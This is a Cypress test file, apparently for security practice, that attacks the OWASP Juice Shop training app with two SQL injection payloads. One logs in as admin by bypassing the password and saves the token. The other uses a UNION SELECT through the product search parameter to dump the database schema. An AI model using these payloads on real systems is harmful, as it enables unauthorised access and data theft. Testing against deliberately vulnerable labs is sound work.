const baseUrl = Cypress.env("JUICESHOP_URL");
const endpoints = Cypress.env("endpoints");

describe("SQL Injection", () => {
  it("Perform SQL Injection to log in as admin", () => {
    const target = "admin@juice-sh.op";

    // Send the SQL injection payload in the login request
    const injection = `${target}' OR '1'='1' --`;
    cy.loginAPI(injection, "anything_bypassed").then((response) => {
      expect(response.status).to.eq(200);
      cy.verifyLoginByAPI(target);
      cy.writeFile("cypress/results/files/admin_token.json", response.body);
    });
  });

  it("Exploite une injection SQL pour révéler le schéma de la base de données", () => {
    const sqlInjectionPayload =
      "test')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, sql FROM sqlite_schema--";
    cy.request({
      method: "GET",
      url: `${baseUrl}${endpoints.api.productSearch}`,
      qs: { q: sqlInjectionPayload }, // Injection dans le paramètre `q`
      headers: {
        "Content-Type": "application/json",
      },
    }).then((response) => {
      expect(response.status).to.eq(200);
      const responseBody = response.body.data;

      expect(responseBody).to.be.an("array");
      expect(responseBody).to.not.be.empty;
      responseBody.forEach((entry) => {
        cy.log("Entrée :", JSON.stringify(entry));
        expect(entry).to.have.any.keys(["sql", "name", "type"]); // Check properties
      });

      cy.writeFile("cypress/results/files/database_schema.json", responseBody);
    });
  });
});
